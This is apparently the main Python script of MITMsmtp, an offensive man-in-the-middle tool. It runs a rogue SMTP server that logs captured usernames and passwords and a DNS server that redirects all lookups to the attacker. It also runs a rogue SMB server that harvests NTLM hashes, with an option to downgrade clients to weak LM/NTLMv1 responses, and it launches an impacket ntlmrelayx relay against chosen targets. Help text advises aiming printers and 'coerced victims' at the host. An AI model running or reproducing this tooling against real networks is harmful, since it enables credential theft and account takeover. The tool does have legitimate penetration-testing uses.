#!/usr/bin/env python3

from SMTPServer import ThreadedSMTPServer
from SMTPHandler import SMTPHandler
from DNSServer import DNSServer
from SMBServer import SMBServer
from relay import NTLMRelay
import threading
import os
import argparse
import signal
import sys
import time

"""
MITMsmtp class for user interaction
"""
class MITMsmtp:
    """ Creates a new MITMsmtp object
    @param server_address: The address to listen on
    @type server_address: str
    @param port: Port to listen on
    @type port: int
    @param server_name: Servers FQDN to send to client
    @type server_address: str
    @param authHandler: The authHandler Object which contains the supported authentication methods
    @type authHandler: authHandler
    @param messageHandler: The messageHandler Object which will be used for storing messages
    @type messageHandler: messageHandler
    @param STARTTLS: Enable server support for STARTTLS (not compatible with SSL/TLS)
    @type STARTTLS: bool
    @param SSL: Enable server support for SSL/TLS (not compatible with STARTTLS)
    @type SSL: bool
    @param certfile: Path to the certfile to be used
    @type certfile: str
    @param keyfile: Path to the keyfile to be used
    @type keyfile: str
    @param printLines: Print communication between client and server on command line
    @type printLines: bool

    @return: Returns a new SMTPServer object
    """
    def __init__(self,
                    server_address,
                    port,
                    server_name,
                    authHandler,
                    messageHandler,
                    STARTTLS=False,
                    SSL=False,
                    certfile=None,
                    keyfile=None,
                    printLines=False):
        self.server_address = server_address
        self.port = port
        self.server_name = server_name
        self.authHandler = authHandler
        self.messageHandler = messageHandler
        self.STARTTLS = STARTTLS
        self.SSL = SSL
        self.certfile = certfile
        self.keyfile = keyfile
        self.printLines = printLines
        self.SMTPServer = None
        self.thread = None

    """
    Starts MITMsmtp Server
    """
    def start(self):
        if (self.thread == None):
            if (self.SSL or self.STARTTLS):
                if (self.certfile == None or self.keyfile == None): #Use default certificates if not specified
                    print("[INFO] Using default certificates")
                    self.certfile = os.path.dirname(os.path.realpath(__file__)) + "/certs/MITMsmtp.crt"
                    self.keyfile = os.path.dirname(os.path.realpath(__file__)) + "/certs/MITMsmtp.key"

            self.SMTPServer = ThreadedSMTPServer((self.server_address, self.port),
                                            self.server_name,
                                            SMTPHandler,
                                            self.authHandler,
                                            self.messageHandler,
                                            self.certfile,
                                            self.keyfile,
                                            self.STARTTLS,
                                            self.SSL,
                                            self.printLines)

            self.thread = threading.Thread(target=self.SMTPServer.serve_forever)
            self.thread.start()
        else:
            raise ValueError("SMTPServer is already running")

    """
    Stops MTIMsmtp Server
    """
    def stop(self):
        if (self.SMTPServer != None and self.thread != None):
            self.SMTPServer.shutdown()
            self.thread.join()
            self.thread = None
            self.SMTPServer.server_close()
        else:
            raise ValueError("MITMsmtp is currently not running")

# Import the proper authentication handlers
from AuthHandler import AuthHandler

class SimpleMessageHandler:
    def addMessage(self):
        return SimpleMessage()

class SimpleMessage:
    def __init__(self):
        self.clientIP = ""
        self.client_name = ""
        self.sender = ""
        self.recipients = []
        self.message = ""
        self.username = ""
        self.password = ""
        
    def setClientIP(self, ip):
        self.clientIP = ip
        
    def setClientName(self, name):
        self.client_name = name
        
    def setSender(self, sender):
        self.sender = sender
        print(f"[SMTP] Sender: {sender}")
        
    def addRecipient(self, recipient):
        self.recipients.append(recipient)
        print(f"[SMTP] Recipient: {recipient}")
        
    def setMessage(self, message):
        self.message = message
        print(f"[SMTP] Message captured ({len(message)} bytes)")
        if len(message) < 500:  # Print short messages
            print(f"[SMTP] Message content: {message}")
        
    def setLogin(self, username, password):
        self.username = username
        self.password = password
        print(f"[SMTP] *** CREDENTIALS CAPTURED *** Username: {username}, Password: {password}")
        
    def setComplete(self):
        print(f"[SMTP] Message complete from {self.sender} to {self.recipients}")

def signal_handler(sig, frame):
    print('\n[INFO] Shutting down...')
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description='MITMsmtp - SMTP Man-in-the-Middle Server with DNS')
    parser.add_argument('--port', type=int, default=587, help='SMTP port to listen on (default: 587)')
    parser.add_argument('--server_address', default='0.0.0.0', help='Address to bind to (default: 0.0.0.0)')
    parser.add_argument('--server_name', default='mail.example.com', help='Server name to present to clients')
    parser.add_argument('--log', help='Log file (currently not implemented)')
    parser.add_argument('--STARTTLS', action='store_true', help='Enable STARTTLS support')
    parser.add_argument('--SSL', action='store_true', help='Enable SSL/TLS support')
    parser.add_argument('--certfile', help='SSL certificate file')
    parser.add_argument('--keyfile', help='SSL key file')
    parser.add_argument('--print-lines', action='store_true', help='Print client-server communication')
    
    # DNS server options
    parser.add_argument('--enable-dns', action='store_true', help='Enable DNS server')
    parser.add_argument('--dns-port', type=int, default=53, help='DNS port to listen on (default: 53)')
    parser.add_argument('--dns-ip', help='IP address to respond with for all DNS queries (defaults to --server_address)')
    parser.add_argument('--print-dns', action='store_true', help='Print DNS queries')

    # SMB server options
    parser.add_argument('--enable-smb', action='store_true', help='Enable rogue SMB server to capture NTLM credentials (e.g. from printers using Scan to SMB)')
    parser.add_argument('--smb-port', type=int, default=445, help='SMB port to listen on (default: 445)')
    parser.add_argument('--smb-challenge', default='1122334455667788', help='8-byte server challenge as 16 hex chars (default: 1122334455667788)')
    parser.add_argument('--smb-target-name', default='WORKGROUP', help='NetBIOS/domain name to advertise to SMB clients (default: WORKGROUP)')
    parser.add_argument('--smb-force-lm-downgrade', action='store_true', help='Force clients into a legacy LMv1/NTLMv1 response to capture weaker LM hashes (hashcat -m 5500)')
    parser.add_argument('--smb-log', help='Directory to append captured SMB hashes to (smb_credentials.log)')
    parser.add_argument('--print-smb', action='store_true', help='Print SMB protocol activity')

    # NTLM relay options (delegates to impacket's ntlmrelayx; install with: pip install impacket)
    parser.add_argument('--relay', action='store_true', help='Enable NTLM relay mode via impacket ntlmrelayx (mutually exclusive with --enable-smb; ntlmrelayx owns port 445)')
    parser.add_argument('--relay-target', action='append', metavar='TARGET', help='Relay target, e.g. smb://10.0.0.5 or ldaps://dc01 (repeatable)')
    parser.add_argument('--relay-targets-file', help='File of relay targets, one per line (ntlmrelayx -tf)')
    parser.add_argument('--relay-no-smb2support', action='store_true', help='Do not pass -smb2support to ntlmrelayx (SMB2 support is on by default)')
    parser.add_argument('--relay-ip', help='IP for ntlmrelayx to bind its listeners to (ntlmrelayx -ip)')
    parser.add_argument('--relay-socks', action='store_true', help='Start the ntlmrelayx SOCKS proxy to reuse relayed sessions (-socks)')
    parser.add_argument('--relay-output-prefix', help='File prefix for ntlmrelayx loot output (-of)')
    parser.add_argument('--relay-extra', help='Raw extra arguments passed verbatim to ntlmrelayx (quoted string)')
    parser.add_argument('--relay-bin', help='Path to ntlmrelayx(.py) if not auto-detected on PATH')
    parser.add_argument('--relay-dry-run', action='store_true', help='Print the ntlmrelayx command that would be run, then exit')

    args = parser.parse_args()

    # Set up signal handler for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)

    # Validate relay options (ntlmrelayx owns port 445, so it can't coexist
    # with our own SMB server).
    if args.relay and args.enable_smb:
        print("[ERROR] --relay and --enable-smb are mutually exclusive: ntlmrelayx binds port 445 itself.")
        print("[HINT] Use --relay to relay live, or --enable-smb to capture hashes for offline cracking.")
        sys.exit(1)

    # Initialize NTLM relay (impacket ntlmrelayx) if enabled
    relay = None
    if args.relay:
        try:
            relay = NTLMRelay(
                targets=args.relay_target,
                targets_file=args.relay_targets_file,
                smb2support=not args.relay_no_smb2support,
                interface_ip=args.relay_ip,
                socks=args.relay_socks,
                output_prefix=args.relay_output_prefix,
                extra_args=args.relay_extra,
                binary=args.relay_bin,
            )
        except ValueError as e:
            print(f"[RELAY ERROR] {e}")
            sys.exit(1)

        if args.relay_dry_run:
            cmd = relay.build_command(allow_tempfile=False)
            print("[RELAY] Command that would be run:")
            print("    " + " ".join(cmd))
            if not NTLMRelay.impacket_installed() and relay.find_binary() is None:
                print("[RELAY] NOTE: impacket/ntlmrelayx not detected. Install with: pip install impacket")
            sys.exit(0)

    # Create handlers
    auth_handler = AuthHandler()
    message_handler = SimpleMessageHandler()

    # Initialize DNS server if enabled
    dns_server = None
    if args.enable_dns:
        dns_ip = args.dns_ip if args.dns_ip else args.server_address
        if dns_ip == '0.0.0.0':
            print("[WARNING] DNS server cannot respond with 0.0.0.0. Please specify --dns-ip or use a specific --server_address")
            sys.exit(1)
        
        dns_server = DNSServer(
            listen_address='0.0.0.0',
            listen_port=args.dns_port,
            response_ip=dns_ip,
            print_queries=args.print_dns
        )

    # Initialize SMB server if enabled
    smb_server = None
    if args.enable_smb:
        try:
            smb_server = SMBServer(
                listen_address=args.server_address,
                listen_port=args.smb_port,
                challenge=args.smb_challenge,
                target_name=args.smb_target_name,
                log_dir=args.smb_log,
                print_smb=args.print_smb,
                force_lm_downgrade=args.smb_force_lm_downgrade
            )
        except ValueError as e:
            print(f"[SMB ERROR] {e}")
            sys.exit(1)

    # Create and start the MITM SMTP server
    mitm_server = MITMsmtp(
        server_address=args.server_address,
        port=args.port,
        server_name=args.server_name,
        authHandler=auth_handler,
        messageHandler=message_handler,
        STARTTLS=args.STARTTLS,
        SSL=args.SSL,
        certfile=args.certfile,
        keyfile=args.keyfile,
        printLines=args.print_lines
    )
    
    try:
        print("=" * 60)
        print("MITMsmtp - SMTP Man-in-the-Middle Server")
        print("=" * 60)
        
        # Start DNS server first (if enabled)
        if dns_server:
            try:
                dns_server.start()
                print(f"[DNS] DNS server listening on port {args.dns_port}")
                print(f"[DNS] All DNS queries will resolve to: {dns_server.response_ip}")
            except Exception as e:
                print(f"[DNS ERROR] Failed to start DNS server: {e}")
                if args.dns_port == 53:
                    print("[DNS HINT] Port 53 requires root privileges. Try: sudo python MITMsmtp.py ...")
                sys.exit(1)

        # Start SMB server (if enabled)
        if smb_server:
            try:
                smb_server.start()
                print(f"[SMB] SMB server listening on {args.server_address}:{args.smb_port}")
                print("[SMB] Point a client (e.g. printer Scan to SMB) at this host to capture NTLM hashes")
            except Exception as e:
                print(f"[SMB ERROR] Failed to start SMB server: {e}")
                if args.smb_port == 445:
                    print("[SMB HINT] Port 445 requires root privileges and must not be in use. Try: sudo python MITMsmtp.py ...")
                sys.exit(1)

        # Start NTLM relay (if enabled)
        if relay:
            try:
                relay.start()
                print("[RELAY] Relaying captured authentications to the configured target(s)")
                print("[RELAY] Tip: pair with --enable-dns so coerced victims resolve to this host")
            except Exception as e:
                print(f"[RELAY ERROR] Failed to start relay: {e}")
                sys.exit(1)

        # Start SMTP server
        print(f"[SMTP] Starting SMTP server on {args.server_address}:{args.port}")
        if args.STARTTLS:
            print("[SMTP] STARTTLS enabled")
        if args.SSL:
            print("[SMTP] SSL/TLS enabled")
        
        mitm_server.start()
        print("[SMTP] SMTP server started successfully")
        
        print("=" * 60)
        print("[INFO] Servers are running. Waiting for connections...")
        if dns_server:
            print("[INFO] Configure clients to use this machine as their DNS server")
        print("[INFO] Press Ctrl+C to stop")
        print("=" * 60)
        
        # Keep the main thread alive
        while True:
            try:
                time.sleep(1)
            except KeyboardInterrupt:
                break
                
    except Exception as e:
        print(f"[ERROR] Failed to start servers: {e}")
    finally:
        print("\n[INFO] Shutting down servers...")
        try:
            if dns_server:
                dns_server.stop()
            if smb_server:
                smb_server.stop()
            if relay:
                relay.stop()
            mitm_server.stop()
            print("[INFO] All servers stopped")
        except:
            pass

if __name__ == "__main__":
    main()
